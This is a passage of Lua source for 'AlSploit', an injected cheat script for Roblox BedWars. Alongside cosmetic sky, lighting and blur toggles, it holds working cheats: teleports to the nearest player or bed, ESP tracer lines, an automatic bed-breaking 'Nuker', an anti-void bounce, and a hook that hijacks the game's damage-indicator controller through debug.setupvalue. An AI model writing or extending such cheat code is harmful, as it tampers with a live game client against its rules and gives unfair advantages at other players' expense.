				if AlSploitSettings.MotionBlur.Value == true and IsAlive(LocalPlayer) == true then
					local CameraPosition = Vector3.new(Camera.CFrame.Position.X, 0, Camera.CFrame.Position.Z)

					task.wait(0.2)

					local CameraPosition2 = Vector3.new(Camera.CFrame.Position.X, 0, Camera.CFrame.Position.Z)
					local Magnitude = (CameraPosition - CameraPosition2).Magnitude

					local TweenInformation = TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0)
					local SizeTween = TweenService:Create(BlurEffect, TweenInformation, {Size = Magnitude})

					SizeTween:Play()

					SizeTween.Completed:Connect(function()
						local TweenInformation = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0)
						local SizeTween = TweenService:Create(BlurEffect, TweenInformation, {Size = 0})

						SizeTween:Play()

						task.wait(1)
					end)
				end		
			until AlSploitSettings.MotionBlur.Value == false or shared.AlSploitUnInjected == true

			BlurEffect.Enabled = false
		end,

		HoverText = "Blurs Your Screen When Based On The Camera Motion 🚶"
	})

	UnInjectEvent.Event:Connect(function()
		BlurEffect:Destroy()
	end)
end)

task.spawn(function()
	local OldEnvironmentSpecularScale = LightingService.EnvironmentSpecularScale
	local OldEnvironmentDiffuseScale = LightingService.EnvironmentDiffuseScale
	local OldGeographicLatitude = LightingService.GeographicLatitude
	local OldOutdoorAmbient = LightingService.OutdoorAmbient
	local OldGlobalShadows = LightingService.GlobalShadows
	local OLdBrightness = LightingService.Brightness
	local OldTimeOfDay = LightingService.TimeOfDay
	local OldClockTime = LightingService.ClockTime
	local OldAmbient = LightingService.Ambient

	local OldAtmosphereDensity = LightingService.Atmosphere.Density
	local OldAtmosphereOffset = LightingService.Atmosphere.Offset
	local OldAtmosphereColor = LightingService.Atmosphere.Color
	local OldAtmosphereDecay = LightingService.Atmosphere.Decay
	local OldAtmosphereGlare = LightingService.Atmosphere.Glare
	local OldAtmosphereHaze = LightingService.Atmosphere.Haze

	local OldTheme = WorldTab:CreateToggle({
		Name = "OldTheme",

		Function = function()
			if AlSploitSettings.OldTheme.Value == true then	
				LightingService.EnvironmentSpecularScale = 1
				LightingService.EnvironmentDiffuseScale = 1
				LightingService.GeographicLatitude = 0
				LightingService.OutdoorAmbient = Color3.new(0.270588, 0.270588, 0.270588)
				LightingService.GlobalShadows = false
				LightingService.Brightness = 3
				LightingService.TimeOfDay = "13:00:00"
				LightingService.ClockTime = 13
				LightingService.Ambient = Color3.new(0.270588, 0.270588, 0.270588)

				if AlSploitSettings.Atmosphere.Value == false then
					LightingService.Atmosphere.Density = 0.1
					LightingService.Atmosphere.Offset = 0.25
					LightingService.Atmosphere.Color = Color3.new(0.776471, 0.776471, 0.776471)
					LightingService.Atmosphere.Decay = Color3.new(0.407843, 0.439216, 0.486275)
					LightingService.Atmosphere.Glare = 0
					LightingService.Atmosphere.Haze = 0
				end
			end

			if AlSploitSettings.OldTheme.Value == false then	
				LightingService.EnvironmentSpecularScale = OldEnvironmentSpecularScale
				LightingService.EnvironmentDiffuseScale = OldEnvironmentDiffuseScale
				LightingService.GeographicLatitude = OldGeographicLatitude
				LightingService.OutdoorAmbient = OldOutdoorAmbient
				LightingService.GlobalShadows = OldGlobalShadows
				LightingService.Brightness = OLdBrightness
				LightingService.TimeOfDay = OldTimeOfDay
				LightingService.ClockTime = OldClockTime
				LightingService.Ambient = OldAmbient

				if AlSploitSettings.Atmosphere.Value == false then
					LightingService.Atmosphere.Density = OldAtmosphereDensity
					LightingService.Atmosphere.Offset = OldAtmosphereOffset
					LightingService.Atmosphere.Color = OldAtmosphereColor
					LightingService.Atmosphere.Decay = OldAtmosphereDecay
					LightingService.Atmosphere.Glare = OldAtmosphereGlare
					LightingService.Atmosphere.Haze = OldAtmosphereHaze
				end
			end
		end,

		HoverText = "Makes The Game Look Old 👴"
	})

	UnInjectEvent.Event:Connect(function()
		LightingService.EnvironmentSpecularScale = OldEnvironmentSpecularScale
		LightingService.EnvironmentDiffuseScale = OldEnvironmentDiffuseScale
		LightingService.GeographicLatitude = OldGeographicLatitude
		LightingService.OutdoorAmbient = OldOutdoorAmbient
		LightingService.GlobalShadows = OldGlobalShadows
		LightingService.Brightness = OLdBrightness
		LightingService.TimeOfDay = OldTimeOfDay
		LightingService.ClockTime = OldClockTime
		LightingService.Ambient = OldAmbient

		LightingService.Atmosphere.Density = OldAtmosphereDensity
		LightingService.Atmosphere.Offset = OldAtmosphereOffset
		LightingService.Atmosphere.Color = OldAtmosphereColor
		LightingService.Atmosphere.Decay = OldAtmosphereDecay
		LightingService.Atmosphere.Glare = OldAtmosphereGlare
		LightingService.Atmosphere.Haze = OldAtmosphereHaze
	end)
end)

task.spawn(function()	
	local OldSpawnDamageIndicator = debug.getupvalue(BedwarsControllers.DamageIndicatorController, 10, {Create})

	local Messages = {"AlSploit", "Best Script", "Raven & Skidware Suck", "🤑", "💀"}

	local Indicators = WorldTab:CreateToggle({
		Name = "Indicators",

		Function = function()
			if AlSploitSettings.Indicators.Value == true then
				debug.setupvalue(BedwarsControllers.DamageIndicatorController, 10, {
					Create = function(self, Indicator, ...)						
						local ColorSplit = string.split(AlSploitSettings.Indicators.Color.Value, ",")

						local R = ColorSplit[1]
						local G = ColorSplit[2]
						local B = ColorSplit[3]

						Indicator.Parent.TextColor3 = Color3.new(R, G, B)
						Indicator.Parent.Text = Messages[math.random(1, #Messages)]

						return game:GetService("TweenService"):Create(Indicator, ...)
					end
				})
			end

			if AlSploitSettings.Indicators.Value == false then
				debug.setupvalue(BedwarsControllers.DamageIndicatorController, 10, {
					OldSpawnDamageIndicator
				})
			end
		end,

		HoverText = "Makes The Damage Indicator Cool 💨"
	})

	UnInjectEvent.Event:Connect(function()
		debug.setupvalue(BedwarsControllers.DamageIndicatorController, 10, {
			OldSpawnDamageIndicator
		})
	end)

	Indicators:CreateColorSlider({
		Name = "Color",

		Function = function() end,

		DefaultValue = Color3.new(0.25098, 0, 1)
	})
end)

task.spawn(function()
	local WinterSky = WorldTab:CreateToggle({
		Name = "WinterSky",

		Function = function()
			if AlSploitSettings.WinterSky.Value == true then
				task.spawn(function()
					local SnowPart = Instance.new("Part")

					SnowPart.Parent = WorkSpace
					SnowPart.Name = "SnowPart"

					SnowPart.Transparency = 1
					SnowPart.CanCollide = false
					SnowPart.Anchored = true
					SnowPart.Size = Vector3.new(240, 0.5, 240)

					local Snow = Instance.new("ParticleEmitter")

					Snow.Parent = SnowPart
					Snow.Name = "Snow"

					Snow.EmissionDirection = Enum.NormalId.Bottom
					Snow.VelocitySpread = 35
					Snow.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.16939899325371, 0), NumberSequenceKeypoint.new(0.23365999758244 ,0.62841498851776, 0.37158501148224), NumberSequenceKeypoint.new(0.56209099292755, 0.38797798752785, 0.2771390080452), NumberSequenceKeypoint.new(0.90577298402786, 0.51912599802017, 0), NumberSequenceKeypoint.new(1, 1, 0)})
					Snow.SpreadAngle = Vector2.new(35, 35)
					Snow.Lifetime = NumberRange.new(8, 14)
					Snow.Rotation = NumberRange.new(110)
					Snow.RotSpeed = NumberRange.new(300)
					Snow.Texture = "rbxassetid://8158344433"
					Snow.Speed = NumberRange.new(8, 18)
					Snow.Rate = 28
					Snow.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0, 0), NumberSequenceKeypoint.new(0.039760299026966, 1.3114800453186, 0.32786899805069), NumberSequenceKeypoint.new(0.7554469704628, 0.98360699415207, 0.44038599729538), NumberSequenceKeypoint.new(1, 0, 0)})

					local WindSnow = Instance.new("ParticleEmitter")

					WindSnow.Parent = SnowPart
					WindSnow.Name = "WindSnow"

					WindSnow.EmissionDirection = Enum.NormalId.Bottom
					WindSnow.VelocitySpread = 35
					WindSnow.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.16939899325371, 0), NumberSequenceKeypoint.new(0.23365999758244, 0.62841498851776, 0.37158501148224), NumberSequenceKeypoint.new(0.56209099292755, 0.38797798752785, 0.2771390080452), NumberSequenceKeypoint.new(0.90577298402786, 0.51912599802017, 0),NumberSequenceKeypoint.new(1, 1, 0)})
					WindSnow.Acceleration = Vector3.new(0, 0, 1)
					WindSnow.SpreadAngle = Vector2.new(35, 35)
					WindSnow.Lifetime = NumberRange.new(8, 14)
					WindSnow.Rotation = NumberRange.new(110)
					WindSnow.RotSpeed = NumberRange.new(100)
					WindSnow.Texture = "rbxassetid://8158344433"
					WindSnow.Speed = NumberRange.new(8, 18)
					WindSnow.Rate = 28
					WindSnow.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0, 0), NumberSequenceKeypoint.new(0.039760299026966, 1.3114800453186, 0.32786899805069), NumberSequenceKeypoint.new(0.7554469704628, 0.98360699415207, 0.44038599729538), NumberSequenceKeypoint.new(1, 0, 0)})

					repeat
						task.wait()

						if IsAlive(LocalPlayer) == true then 
							SnowPart.CFrame = (LocalPlayer.Character.PrimaryPart.CFrame + Vector3.new(0, 100, 0))
						end
					until shared.AlSploitUnInjected == true or AlSploitSettings.WinterSky.Value == false

					SnowPart:Destroy()
					WindSnow:Destroy()
					Snow:Destroy()
				end)

				task.spawn(function()
					task.spawn(function()
						if LightingService:FindFirstChild("Sky") then
							LightingService.Sky.Parent = ReplicatedStorageService				
						end
					end)			

					task.spawn(function()
						local Sky = Instance.new("Sky")

						Sky.Parent = LightingService
						Sky.Name = "WinterSky"

						Sky.MoonAngularSize = 30
						Sky.SunAngularSize = 11
						Sky.MoonTextureId = "rbxassetid://8139665943"
						Sky.SunTextureId = "rbxassetid://6196665106"
						Sky.StarCount = 5000
						Sky.SkyboxUp = "rbxassetid://8139676647"
						Sky.SkyboxLf = "rbxassetid://8139676988"
						Sky.SkyboxFt = "rbxassetid://8139677111"
						Sky.SkyboxBk = "rbxassetid://8139677359"
						Sky.SkyboxDn = "rbxassetid://8139677253"
						Sky.SkyboxRt = "rbxassetid://8139676842"						
					end)

					task.spawn(function()
						if LightingService:FindFirstChildOfClass("SunRaysEffect") then
							LightingService:FindFirstChildOfClass("SunRaysEffect"):Destroy()

							local SunRaysEffect = Instance.new("SunRaysEffect")

							SunRaysEffect.Parent = LightingService
							SunRaysEffect.Name = "SunRaysEffect"

							SunRaysEffect.Intensity = 0.03
						end
					end)

					task.spawn(function()
						if not LightingService:FindFirstChildOfClass("SunRaysEffect") then
							local SunRay = Instance.new("SunRaysEffect")

							SunRay.Parent = LightingService
							SunRay.Name = "SunRay"

							SunRay.Intensity = 0.03
						end
					end)

					task.spawn(function()
						if LightingService:FindFirstChildOfClass("BloomEffect") then
							LightingService:FindFirstChildOfClass("BloomEffect"):Destroy()

							local BloomEffect = Instance.new("BloomEffect")

							BloomEffect.Parent = LightingService
							BloomEffect.Name = "BloomEffect"

							BloomEffect.Threshold = 2
							BloomEffect.Intensity = 1
							BloomEffect.Size = 2
						end
					end)

					task.spawn(function()
						if not LightingService:FindFirstChildOfClass("BloomEffect") then
							local BloomEffect = Instance.new("BloomEffect")

							BloomEffect.Parent = LightingService
							BloomEffect.Name = "BloomEffect"

							BloomEffect.Threshold = 2
							BloomEffect.Intensity = 1
							BloomEffect.Size = 2
						end
					end)

					task.spawn(function()
						if LightingService:FindFirstChildOfClass("Atmosphere") then
							LightingService:FindFirstChildOfClass("Atmosphere"):Destroy()

							local Atmosphere = Instance.new("Atmosphere")

							Atmosphere.Parent = LightingService
							Atmosphere.Name = "Atmosphere"

							Atmosphere.Density = 0.3
							Atmosphere.Offset = 0.25
							Atmosphere.Color = Color3.new(0.776471, 0.776471, 0.776471)
							Atmosphere.Decay = Color3.new(0.407843, 0.439216, 0.486275)
							Atmosphere.Glare = 0
							Atmosphere.Haze = 0
						end
					end)

					task.spawn(function()
						if not LightingService:FindFirstChildOfClass("Atmosphere") and AlSploitSettings.Atmosphere.Value == false then
							local Atmosphere = Instance.new("Atmosphere")

							Atmosphere.Parent = LightingService
							Atmosphere.Name = "Atmosphere"

							Atmosphere.Density = 0.3
							Atmosphere.Offset = 0.25
							Atmosphere.Color = Color3.new(0.776471, 0.776471, 0.776471)
							Atmosphere.Decay = Color3.new(0.407843, 0.439216, 0.486275)
							Atmosphere.Glare = 0
							Atmosphere.Haze = 0
						end
					end)

					task.spawn(function()
						if LightingService:FindFirstChild("GalaxySky")then
							LightingService.GalaxySky:Destroy()					
						end
					end)
				end)	
			end

			if AlSploitSettings.WinterSky.Value == false then
				if ReplicatedStorageService:FindFirstChild("Sky") and LightingService:FindFirstChild("WinterSky") then
					ReplicatedStorageService:FindFirstChild("Sky").Parent = LightingService 		

					LightingService.WinterSky:Destroy()	
				end
			end
		end,

		HoverText = "Makes Your Sky Look Like Winter ⛄"
	})

	UnInjectEvent.Event:Connect(function()
		if ReplicatedStorageService:FindFirstChild("Sky") and LightingService:FindFirstChild("WinterSky") then
			ReplicatedStorageService:FindFirstChild("Sky").Parent = LightingService 		

			LightingService.WinterSky:Destroy()	
		end
	end)
end)

task.spawn(function()
	local GalaxySky = WorldTab:CreateToggle({
		Name = "GalaxySky",

		Function = function()
			if AlSploitSettings.GalaxySky.Value == true then
				if LightingService:FindFirstChild("Sky") then
					LightingService.Sky.Parent = ReplicatedStorageService

					local Sky = Instance.new("Sky")
					local ID = 8281961896

					Sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. ID

					Sky.Parent = LightingService
					Sky.Name = "GalaxySky"
				end

				if LightingService:FindFirstChild("WinterSky") then
					LightingService.WinterSky:Destroy()

					local Sky = Instance.new("Sky")
					local ID = 8281961896

					Sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. ID

					Sky.Parent = LightingService
					Sky.Name = "GalaxySky"

					if WorkSpace:FindFirstChild("SnowPart") then
						WorkSpace.SnowPart:Destroy()
					end

					if WorkSpace:FindFirstChild("Snow") then
						WorkSpace.Snow:Destroy()
					end

					if WorkSpace:FindFirstChild("WindSnow") then
						WorkSpace.WindSnow:Destroy()
					end
				end	
			end

			if AlSploitSettings.GalaxySky.Value == false then
				if ReplicatedStorageService:FindFirstChild("Sky") and LightingService:FindFirstChild("GalaxySky") then
					ReplicatedStorageService.Sky.Parent = LightingService 

					LightingService.GalaxySky:Destroy()				
				end
			end
		end,

		HoverText = "Makes Your Sky Look Like A Galaxy 🌌"
	})

	UnInjectEvent.Event:Connect(function()
		if ReplicatedStorageService:FindFirstChild("Sky") and LightingService:FindFirstChild("GalaxySky") then
			ReplicatedStorageService.Sky.Parent = LightingService 

			LightingService.GalaxySky:Destroy()				
		end
	end)
end)

task.spawn(function()
	local PlayerTp = WorldTab:CreateToggle({
		Name = "PlayerTp",

		Function = function()
			if AlSploitSettings.PlayerTp.Value == true then
				if IsAlive(LocalPlayer) == true then
					repeat task.wait() until shared.AlSploitUnInjected == true or GetMatchState() ~= 0

					task.spawn(function()
						if AlSploitSettings.PlayerTp.Value == true then
							if FindNearestPlayer() and LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Bed").Value == "✅" then
								KillLocalPlayer()

								LocalPlayer.CharacterAdded:Connect(function()
									repeat task.wait() until shared.AlSploitUnInjected == true or IsAlive(LocalPlayer)

									if IsAlive(LocalPlayer) == true and AlSploitSettings.PlayerTp.Value == true and FindNearestPlayer() then
										task.wait(0.15)

										TweenToNearestPlayer()
									end
								end)
							end	
						end

						if LocalPlayer.leaderstats and LocalPlayer.leaderstats.Bed and LocalPlayer.leaderstats.Bed.Value == "❌" then
							CreateNotification(3, "Unable To Teleport To Player, You Have No Bed")
						end
					end)					
				end				
			end	
		end,

		HoverText = "Teleports You To The Nearest Player 👨‍🌾"
	})

	AlSploitConnections["PlayerTpConnection"] = LocalPlayer.CharacterAdded:Connect(function()
		repeat task.wait() until (GetMatchState() ~= 0 and IsAlive(LocalPlayer) == true) or shared.AlSploitUnInjected == true or AlSploitSettings.PlayerTp.Value == false

		local NearestBed = FindNearestPlayer()

		if NearestBed then
			if AlSploitSettings.PlayerTp.Value == true and shared.AlSploitUnInjected == false and LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Bed").Value == "✅" then
				repeat task.wait() until IsAlive(LocalPlayer) == true or shared.AlSploitUnInjected == true or AlSploitSettings.PlayerTp.Value == false

				task.wait(0.25)

				TweenToNearestPlayer()
			end
		end 
	end)
end)

task.spawn(function()
	task.spawn(function()
		local AntiVoidPart

		local AntiVoid = WorldTab:CreateToggle({
			Name = "AntiVoid",

			Function = function()
				if AlSploitSettings.AntiVoid.Value == true then
					repeat task.wait() until GetMatchState() ~= 0 or shared.AlSploitUnInjected == true or AlSploitSettings.AntiVoid.Value == false

					if AlSploitSettings.AntiVoid.Value == true and shared.AlSploitUnInjected == false then
						local OldLowestPosition = math.huge
						local LowestPosition = 999999

						local BlockRaycastParameters = RaycastParams.new()

						BlockRaycastParameters.FilterDescendantsInstances = {CollectionServiceBlocks}
						BlockRaycastParameters.FilterType = Enum.RaycastFilterType.Include

						AntiVoidPart = Instance.new("Part")

						AntiVoidPart.Parent = WorkSpace
						AntiVoidPart.Name = "AntiVoidPart"

						AntiVoidPart.Transparency = (AlSploitSettings.AntiVoid.Transparency.Value / 100)
						AntiVoidPart.CanCollide = false
						AntiVoidPart.Anchored = true
						AntiVoidPart.Material = Enum.Material.Neon
						AntiVoidPart.Position = Vector3.new(0, 99999, 0)

						local ColorSplit = string.split(AlSploitSettings.AntiVoid.Color.Value, ",")

						local R = ColorSplit[1]
						local G = ColorSplit[2]
						local B = ColorSplit[3]  

						AntiVoidPart.Color = Color3.new(R, G, B)
						AntiVoidPart.Size = Vector3.new(99999, 1, 99999)

						task.spawn(function()
							for i, v in next, CollectionServiceBlocks do
								local NewRay = WorkSpace:Raycast((v.Position + Vector3.new(0, 1000, 0)), Vector3.new(0, -1000, 0), BlockRaycastParameters)

								if NewRay and NewRay.Position then
									LowestPosition = NewRay.Position.Y

									if LowestPosition <= OldLowestPosition then
										OldLowestPosition = LowestPosition

										AntiVoidPart.Position = Vector3.new(0, (LowestPosition - 4), 0)
									end
								end					
							end
						end)

						task.spawn(function()
							AlSploitConnections["AntiVoidConnection"] = AntiVoidPart.Touched:Connect(function()
								if IsAlive(LocalPlayer) and AntiVoidPart and LocalPlayer.Character.PrimaryPart.Position.Y <= WorkSpace.AntiVoidPart.Position.Y then
									for i = 1, 3 do
										if IsAlive(LocalPlayer) then
											LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(LocalPlayer.Character.PrimaryPart.Velocity.X, 100, LocalPlayer.Character.PrimaryPart.Velocity.Z)
										end
									end
								end
							end)
						end)
					end
				end

				if AlSploitSettings.AntiVoid.Value == false and AntiVoidPart then
					AntiVoidPart:Destroy()
				end
			end,

			HoverText = "Makes The Damage Indicator Cool 💨"
		})

		AntiVoid:CreateSlider({
			Name = "Transparency",

			Function = function() 
				if AlSploitSettings.AntiVoid.Value == true and AntiVoidPart then
					AntiVoidPart.Transparency = (AlSploitSettings.AntiVoid.Transparency.Value / 100)
				end
			end,

			MaximumValue = 100,
			DefaultValue = 60
		})

		AntiVoid:CreateColorSlider({
			Name = "Color",

			Function = function() 
				if AlSploitSettings.AntiVoid.Value == true and AntiVoidPart then
					local ColorSplit = string.split(AlSploitSettings.AntiVoid.Color.Value, ",")

					local R = ColorSplit[1]
					local G = ColorSplit[2]
					local B = ColorSplit[3]  

					AntiVoidPart.Color = Color3.new(R, G, B)
				end
			end,

			DefaultValue = Color3.new(0.282353, 0, 1)
		})

		UnInjectEvent.Event:Connect(function()
			if AntiVoidPart then
				AntiVoidPart:Destroy()
			end
		end)
	end)
end)

task.spawn(function()	
	local function CreateTracer(Player)	
		if IsAlive(Player) == true and Drawing then
			local CurrentCamera = WorkSpace.CurrentCamera
			local WorldToViewportPoint = CurrentCamera.WorldToViewportPoint

			local Tracer = Drawing.new("Line")

			Tracer.Transparency = 1
			Tracer.Thickness = 1.5
			Tracer.Visible = false

			task.spawn(function()
				repeat
					task.wait()

					if IsAlive(Player) and AlSploitSettings.Tracers.Value == true then
						local Vector, OnScreen = Camera:WorldToViewportPoint(Player.Character.PrimaryPart.Position)

						Tracer.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
						Tracer.To = Vector2.new(Vector.X, Vector.Y)			

						if OnScreen == true then
							Tracer.Visible = true
						end

						if OnScreen == false then
							Tracer.Visible = false
						end

						task.spawn(function()
							if AlSploitSettings.Tracers.ShowTeamates.Value == true and OnScreen == true then
								if Player.Team == LocalPlayer.Team then
									Tracer.Visible = true
								end
							end

							if AlSploitSettings.Tracers.ShowTeamates.Value == false or OnScreen == false then
								if Player.Team == LocalPlayer.Team then
									Tracer.Visible = false
								end
							end
						end)

						task.spawn(function()
							if AlSploitSettings.Tracers.ShowEnemies.Value == true and OnScreen == true then
								if Player.Team ~= LocalPlayer.Team then
									Tracer.Visible = true
								end
							end

							if AlSploitSettings.Tracers.ShowEnemies.Value == false and OnScreen == false then
								if Player.Team ~= LocalPlayer.Team then
									Tracer.Visible = false
								end
							end
						end)

						task.spawn(function()
							if AlSploitSettings.Tracers.UseTeamatesTeamColor.Value == true or AlSploitSettings.Tracers.UseEnemiesTeamColor.Value == true then
								if AlSploitSettings.Tracers.UseTeamatesTeamColor.Value == true and Player.Team == LocalPlayer.Team then
									Tracer.Color = Player.TeamColor.Color
								end

								if AlSploitSettings.Tracers.UseEnemiesTeamColor.Value == true and Player.Team ~= LocalPlayer.Team then
									Tracer.Color = Player.TeamColor.Color
								end	
							end

							if AlSploitSettings.Tracers.UseTeamatesTeamColor.Value == false or AlSploitSettings.Tracers.UseEnemiesTeamColor.Value == false then	
								if Player.Team == LocalPlayer.Team then									
									local ColorSplit = string.split(AlSploitSettings.Tracers.TeamatesColor.Value, ",")

									local R = ColorSplit[1]
									local G = ColorSplit[2]
									local B = ColorSplit[3]

									Tracer.Color = Color3.new(R, G, B)
								end

								if Player.Team ~= LocalPlayer.Team then
									local ColorSplit = string.split(AlSploitSettings.Tracers.EnemiesColor.Value, ",")

									local R = ColorSplit[1]
									local G = ColorSplit[2]
									local B = ColorSplit[3]

									Tracer.Color = Color3.new(R, G, B)
								end
							end
						end)
					end		
				until shared.AlSploitUnInjected == true or AlSploitSettings.Tracers.Value == false or not Player or IsAlive(Player) == false

				Tracer:Remove()
			end)
		end

		if not Drawing then
			CreateNotification(3, "Tracers Not Supported")
		end
	end

	local Tracers = WorldTab:CreateToggle({
		Name = "Tracers",

		Function = function()
			task.spawn(function()
				repeat task.wait() until GetMatchState() ~= 0 or AlSploitSettings.Tracers.Value == false or shared.AlSploitUnInjected == true

				if AlSploitSettings.Tracers.Value == true and shared.AlSploitUnInjected == false then			
					for i, v in next, PlayerService:GetPlayers() do
						if IsAlive(v) == true and v ~= LocalPlayer then						
							CreateTracer(v)
						end

						AlSploitConnections["TracersConnection"] = v.CharacterAdded:Connect(function(Character)
							repeat task.wait() until AlSploitSettings.Tracers.Value == false or shared.AlSploitUnInjected == true or IsAlive(PlayerService:FindFirstChild(Character.Name)) == true		

							if AlSploitSettings.Tracers.Value == true and shared.AlSploitUnInjected == false and IsAlive(PlayerService:FindFirstChild(Character.Name)) == true and v ~= LocalPlayer then							
								CreateTracer(v)
							end
						end)
					end
				end
			end)
		end,

		HoverText = "Esp But With Tracers 📜"
	})

	Tracers:CreateToggle({
		Name = "UseTeamatesTeamColor",

		Function = function() end,

		DefaultValue = false
	})

	Tracers:CreateToggle({
		Name = "UseEnemiesTeamColor",

		Function = function() end,

		DefaultValue = false
	})

	Tracers:CreateToggle({
		Name = "ShowTeamates",

		Function = function() end,

		DefaultValue = true
	})

	Tracers:CreateToggle({
		Name = "ShowEnemies",

		Function = function() end,

		DefaultValue = true
	})

	Tracers:CreateColorSlider({
		Name = "TeamatesColor",

		Function = function() end,

		DefaultValue = Color3.new(0.27451, 0.054902, 1)
	})

	Tracers:CreateColorSlider({
		Name = "EnemiesColor",

		Function = function() end,

		DefaultValue = Color3.new(1, 0, 0)
	})
end)

task.spawn(function()
	local BedTp = WorldTab:CreateToggle({
		Name = "BedTp",

		Function = function()
			if AlSploitSettings.BedTp.Value == true then
				if IsAlive(LocalPlayer) == true then
					repeat task.wait() until shared.AlSploitUnInjected == true or GetMatchState() ~= 0

					task.spawn(function()
						if AlSploitSettings.BedTp.Value == true then
							if FindNearestBed(false) and LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Bed").Value == "✅" then
								KillLocalPlayer()

								LocalPlayer.CharacterAdded:Connect(function()
									repeat task.wait() until shared.AlSploitUnInjected == true or IsAlive(LocalPlayer)

									if IsAlive(LocalPlayer) == true and AlSploitSettings.BedTp.Value == true and FindNearestBed(false) then
										task.wait(0.15)

										TweenToNearestBed()
									end
								end)
							end	
						end

						if LocalPlayer.leaderstats and LocalPlayer.leaderstats.Bed and LocalPlayer.leaderstats.Bed.Value == "❌" then
							CreateNotification(3, "Unable To Teleport To Bed, You Have No Bed")
						end
					end)					
				end				
			end	
		end,

		HoverText = "Teleports You To The Nearest Bed 🛏️"
	})

	AlSploitConnections["BedTpConnection"] = LocalPlayer.CharacterAdded:Connect(function()
		repeat task.wait() until (GetMatchState() ~= 0 and IsAlive(LocalPlayer) == true) or shared.AlSploitUnInjected == true or AlSploitSettings.BedTp.Value == false

		local NearestBed = FindNearestBed(false)

		if NearestBed then
			if AlSploitSettings.BedTp.Value == true and shared.AlSploitUnInjected == false and LocalPlayer:FindFirstChild("leaderstats"):FindFirstChild("Bed").Value == "✅" then
				repeat task.wait() until IsAlive(LocalPlayer) == true or shared.AlSploitUnInjected == true or AlSploitSettings.BedTp.Value == false

				task.wait(0.25)

				TweenToNearestBed()
			end
		end 
	end)
end)

task.spawn(function()
	local TargetBlockFound = false

	local Nuker = WorldTab:CreateToggle({
		Name = "Nuker",

		Function = function()
			task.spawn(function()
				repeat
					task.wait()

					if GetMatchState() ~= 0 and IsAlive(LocalPlayer) == true then					
						local NearestBed = FindNearestBed(true, AlSploitSettings.Nuker.Range.Value)

						local NearestLuckyBlock
						local NearestOre

						if AlSploitSettings.Nuker.MineLuckyBlocks.Value == true then						
							NearestLuckyBlock = FindNearestLuckyBlock(AlSploitSettings.Nuker.Range.Value)
						end

						if AlSploitSettings.Nuker.MineOres.Value == true then
							NearestOre = FindNearestOre(AlSploitSettings.Nuker.Range.Value)
						end

						if NearestBed or NearestLuckyBlock or NearestOre and AlSploitSettings.Nuker.MiningAnimation.Value == true then
							TargetBlockFound = (NearestBed or NearestLuckyBlock or NearestOre)	
						end

						if NearestBed then						
							local NearestBedCovered = IsBlockCovered(NearestBed.Position)

							local Strength, TargetBlock = FindBestBreakSide(NearestBed.Position)
							local Strength2, TargetBlock2 = FindBestBreakSide(NearestBed.Position + Vector3.new(0, 0, 3))

							local TargetBlock = (Strength < Strength2 and TargetBlock or TargetBlock2)

							if NearestBedCovered == false then
								TargetBlock = NearestBed
							end		

							DamageBlock(TargetBlock.Position, true)
							DamageBlock(TargetBlock.Position, false)
						end

						if not NearestBed then		
							TargetBlockFound = nil

							if NearestLuckyBlock then
								DamageBlock(NearestLuckyBlock.Position, true)
								DamageBlock(NearestLuckyBlock.Position, false)
							end

							if NearestOre then
								DamageBlock(NearestOre.Position, true)
								DamageBlock(NearestOre.Position, false)
							end
						end
					end
				until AlSploitSettings.Nuker.Value == false or shared.AlSploitUnInjected == true
			end)

			task.spawn(function()
				repeat
					task.wait()

					if AlSploitSettings.Nuker.MiningAnimation.Value == true and TargetBlockFound and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
						local NearestEntity = FindNearestEntity(AlSploitSettings.Killaura.Range.Value)
						local I, Value = Camera:WorldToScreenPoint(TargetBlockFound.Position)

						if Value == true and not NearestEntity then
							BedwarsControllers.KnitViewModelController:playAnimation(15)

							task.wait(0.2)
						end
					end
				until AlSploitSettings.Nuker.Value == false or shared.AlSploitUnInjected == true
			end)
		end,

		HoverText = "Automatically Breaks Blocks ⛓️‍💥"
	})

	Nuker:CreateToggle({
		Name = "MiningAnimation",

		Function = function() end,

		DefaultValue = true
	})

	Nuker:CreateToggle({
		Name = "MineLuckyBlocks",

		Function = function() end,

		DefaultValue = true
	})

	Nuker:CreateToggle({
		Name = "MineOres",

		Function = function() end,

		DefaultValue = true
	})

	Nuker:CreateSlider({
		Name = "Range",

		Function = function() end,

		MaximumValue = 30,
		DefaultValue = 30
	})
end)

task.spawn(function()
	local HalloweenCapeId = "rbxassetid://74330263398056"
	local HalloweenCape

	local function CreateCape(DecalId)
		local Cape = Instance.new("Part")

		Cape.Parent = LocalPlayer.Character
		Cape.Name = "Cape"

		Cape.CanCollide = false
		Cape.Material = Enum.Material.SmoothPlastic
		Cape.Color = Color3.new(0.105882, 0.105882, 0.105882)
		Cape.Size = Vector3.new(0.2, 0.2, 0.08)

		local BlockMesh = Instance.new("BlockMesh")

		BlockMesh.Parent = Cape
		BlockMesh.Name = "Mesh"

		BlockMesh.VertexColor = Vector3.new(1, 1, 1)
		BlockMesh.Scale = Vector3.new(9, 17.5, 0.5)

		local Motor = Instance.new("Motor")
